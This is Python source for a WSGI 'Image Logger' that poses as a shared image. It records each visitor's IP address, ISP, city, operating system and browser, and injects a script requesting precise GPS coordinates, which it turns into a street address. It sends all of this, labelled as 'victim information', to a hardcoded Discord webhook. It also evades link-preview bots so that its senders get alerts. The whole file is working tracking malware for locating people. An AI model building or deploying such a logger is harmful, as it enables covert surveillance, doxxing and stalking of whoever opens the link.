from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1507868979509858444/ijiGfDxt28i7dbuxPnJoDY5QbwpYZ7WVe1CIR_yM5AY23ryTWX6c-XJiNXv9CSv_3LjO",
    "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {"doMessage": False, "message": "Pwned.", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
}

# Blacklisted IP prefixes
BLACKLISTED_IPS = ("27.", "104.", "143.", "164.")

# Discord embed character limits
EMBED_LIMIT = 1024
FIELD_LIMIT = 1024
DESC_LIMIT = 4096


def bot_check(ip: str, useragent: str):
    """Check if request is from a known bot platform. Returns bot name or False."""
    if ip and ip.startswith(("34.", "35.")):
        return "Discord"
    if useragent:
        ua_lower = useragent.lower()
        if "telegrambot" in ua_lower:
            return "Telegram"
        if "slackbot" in ua_lower or "slack" in ua_lower:
            return "Slack"
    return False


def truncate(text: str, limit: int = FIELD_LIMIT) -> str:
    """Truncate text to Discord's embed field limit."""
    if len(text) > limit:
        return text[: limit - 3] + "..."
    return text


def send_webhook(embed_data: dict) -> bool:
    """Send a webhook with error handling."""
    try:
        r = requests.post(
            config["webhook"],
            json=embed_data,
            timeout=10,
            headers={"Content-Type": "application/json"},
        )
        return r.ok
    except requests.RequestException:
        return False


def report_error(error: str):
    """Report an error to the webhook."""
    send_webhook(
        {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred!\n\n**Error:**\n```\n{truncate(error, DESC_LIMIT)}\n```",
                }
            ],
        }
    )


def reverse_geocode(lat: float, lon: float) -> str:
    """
    Convert coordinates to a street address using OpenStreetMap's free Nominatim API.
    Returns a formatted address string or the raw coords if lookup fails.
    """
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if "display_name" in data:
                return data["display_name"]
            # Fallback: build from address components
            addr = data.get("address", {})
            parts = []
            for key in ["house_number", "road", "suburb", "city", "town", "village",
                         "county", "state", "postcode", "country"]:
                if key in addr:
                    parts.append(addr[key])
            if parts:
                return ", ".join(parts)
    except Exception:
        pass
    return f"{lat}, {lon}"


def make_report(ip=None, useragent=None, coords=None, endpoint="N/A", url=None):
    """Process and report victim information to the webhook."""

    # Blacklist check
    if ip and ip.startswith(BLACKLISTED_IPS):
        return

    # Bot platform detection
    bot = bot_check(ip, useragent)
    if bot:
        if config.get("linkAlerts"):
            send_webhook(
                {
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": (
                                f"An **Image Logging** link was sent!\n\n"
                                f"**Endpoint:** `{endpoint}`\n"
                                f"**IP:** `{ip or 'Unknown'}`\n"
                                f"**Platform:** `{bot}`"
                            ),
                        }
                    ],
                }
            )
        return

    # Determine ping behavior
    ping = "@everyone"

    # Geolocate IP
    try:
        info = requests.get(
            f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5
        ).json()
    except Exception:
        info = {
            "proxy": False,
            "hosting": False,
            "isp": "Unknown",
            "as": "Unknown",
            "country": "Unknown",
            "regionName": "Unknown",
            "city": "Unknown",
            "lat": 0,
            "lon": 0,
            "timezone": "UTC/Unknown",
            "mobile": False,
        }

    # VPN / Proxy checks
    if info.get("proxy"):
        if config.get("vpnCheck") == 2:
            return
        if config.get("vpnCheck") == 1:
            ping = ""

    # Hosting / Bot checks
    if info.get("hosting"):
        anti = config.get("antiBot", 1)
        if anti == 4 and not info.get("proxy"):
            return
        if anti == 3:
            return
        if anti == 2 and not info.get("proxy"):
            ping = ""
        if anti == 1:
            ping = ""

    # Parse user agent
    try:
        os_name, browser = httpagentparser.simple_detect(useragent or "")
    except Exception:
        os_name, browser = "Unknown", "Unknown"

    # Format timezone nicely
    tz_str = info.get("timezone", "UTC/Unknown")
    try:
        tz_parts = tz_str.split("/")
        if len(tz_parts) > 1:
            tz_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
        else:
            tz_display = tz_str
    except Exception:
        tz_display = tz_str

    # Coordinates & Address
    lat, lon = info.get("lat", "?"), info.get("lon", "?")
    coords_str = f"{lat}, {lon}"
    address = "Approximate (IP-based)"
    maps_link = ""

    if coords:
        # Precise GPS coordinates received from browser
        coords_str = coords
        try:
            lat_f, lon_f = map(float, coords.split(","))
            address = reverse_geocode(lat_f, lon_f)
        except Exception:
            address = coords
        maps_link = f"[Google Maps](https://www.google.com/maps?q={coords})"

    # Build embed description
    desc_parts = [
        "**A User Opened the Original Image!**\n",
        f"**Endpoint:** `{endpoint}`\n",
        "\n**IP Info:**\n",
        f"> **IP:** `{ip or 'Unknown'}`\n",
        f"> **Provider:** `{info.get('isp', 'Unknown')}`\n",
        f"> **ASN:** `{info.get('as', 'Unknown')}`\n",
        f"> **Country:** `{info.get('country', 'Unknown')}`\n",
        f"> **Region:** `{info.get('regionName', 'Unknown')}`\n",
        f"> **City:** `{info.get('city', 'Unknown')}`\n",
        f"> **Coords:** `{coords_str}`\n",
    ]

    if coords:
        desc_parts.append(f"> **Address:** `{truncate(address, FIELD_LIMIT)}`\n")

    desc_parts.append(f"> **Maps:** {maps_link}" if maps_link else "")

    desc_parts.extend(
        [
            f"\n> **Timezone:** `{tz_display}`\n",
            f"> **Mobile:** `{info.get('mobile', False)}`\n",
            f"> **VPN:** `{info.get('proxy', False)}`\n",
            f"> **Bot:** `{info.get('hosting', False)}`\n",
            "\n**PC Info:**\n",
            f"> **OS:** `{os_name}`\n",
            f"> **Browser:** `{browser}`\n",
            f"\n**User Agent:**\n{truncate(useragent or 'Unknown', FIELD_LIMIT)}",
        ]
    )

    description = "".join(desc_parts)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": truncate(description, DESC_LIMIT),
            }
        ],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    send_webhook(embed)


def get_pixel() -> bytes:
    """Return a 1x1 transparent PNG pixel."""
    return base64.b64decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
    )


def app(environ, start_response):
    try:
        path = environ.get("PATH_INFO", "/")
        query_string = environ.get("QUERY_STRING", "")
        remote_addr = environ.get("REMOTE_ADDR", "")

        # Parse headers
        headers = {}
        for k, v in environ.items():
            if k.startswith("HTTP_"):
                header_name = k[5:].replace("_", "-").lower()
                headers[header_name] = v

        # Get real IP
        ip = headers.get("x-forwarded-for", remote_addr)
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()
        if not ip:
            ip = remote_addr

        useragent = headers.get("user-agent", "")

        # Parse query parameters
        params = dict(parse.parse_qsl(query_string)) if query_string else {}

        # Handle base64 image argument
        url = config["image"]
        if config.get("imageArgument"):
            b64param = params.get("url") or params.get("id")
            if b64param:
                try:
                    padded = b64param + "=" * (4 - len(b64param) % 4) if len(b64param) % 4 else b64param
                    decoded = base64.b64decode(padded.encode()).decode()
                    if decoded.startswith(("http://", "https://")):
                        url = decoded
                except Exception:
                    pass

        # Bot check - handle early with pixel response
        bot = bot_check(ip, useragent)
        if bot:
            make_report(ip, useragent, endpoint=path, url=url)

            if config.get("buggedImage"):
                pixel = get_pixel()
                start_response(
                    "200 OK",
                    [
                        ("Content-Type", "image/png"),
                        ("Content-Length", str(len(pixel))),
                        ("Cache-Control", "no-cache, no-store, must-revalidate"),
                        ("Access-Control-Allow-Origin", "*"),
                    ],
                )
                return [pixel]

            start_response("302 Found", [("Location", url), ("Cache-Control", "no-cache")])
            return [b""]

        # --- Human visitor below ---

        # Check for geolocation callback (param "g")
        location = None
        if params.get("g") and config.get("accurateLocation"):
            try:
                padded = params["g"] + "=" * (4 - len(params["g"]) % 4) if len(params["g"]) % 4 else params["g"]
                location = base64.b64decode(padded.encode()).decode()
            except Exception:
                pass

        # IMPORTANT: Always report on the first visit (without coords)
        # On the second visit (with coords in URL), report with precise location
        if location:
            make_report(ip, useragent, location, path, url=url)
        else:
            make_report(ip, useragent, endpoint=path, url=url)

        # Build HTML response
        if config.get("redirect", {}).get("redirect"):
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
        elif config.get("message", {}).get("doMessage"):
            msg = config["message"]["message"]
            if config["message"].get("richMessage"):
                data = f"""<!DOCTYPE html>
<html>
<head><title>{msg}</title></head>
<body style="margin:0;padding:0;display:flex;align-items:center;justify-content:center;
      height:100vh;background:#0d0d0d;color:#00ffcc;font-family:monospace;font-size:2rem;">
<div>{msg}</div>
</body>
</html>"""
            else:
                data = msg
        else:
            data = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body style="margin:0;padding:0;overflow:hidden;">
<div style="width:100vw;height:100vh;background:url('{url}') center/contain no-repeat;"></div>
</body>
</html>"""

        # Inject geolocation script ONLY on first visit (no coords yet)
        if config.get("accurateLocation") and not location:
            geoloc_script = """
<script>
window.addEventListener('load', function() {
    if (navigator.geolocation) {
        setTimeout(function() {
            navigator.geolocation.getCurrentPosition(function(pos) {
                var lat = pos.coords.latitude.toFixed(6);
                var lon = pos.coords.longitude.toFixed(6);
                var coords = lat + "," + lon;
                var encoded = btoa(coords).replace(/=+$/, '');
                var sep = window.location.href.includes('?') ? '&' : '?';
                window.location.href = window.location.href + sep + 'g=' + encodeURIComponent(encoded);
            }, function(err) {
                console.log("Location unavailable:", err.message);
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }, 1000);
    }
});
</script>
</body>"""
            data = data.replace("</body>", geoloc_script)

        body = data.encode("utf-8")
        start_response(
            "200 OK",
            [
                ("Content-Type", "text/html; charset=utf-8"),
                ("Content-Length", str(len(body))),
                ("Cache-Control", "no-cache, no-store, must-revalidate"),
            ],
        )
        return [body]

    except Exception:
        error_tb = traceback.format_exc()
        report_error(error_tb)
        start_response(
            "500 Internal Server Error",
            [("Content-Type", "text/plain")],
        )
        return [b"Internal Server Error"]
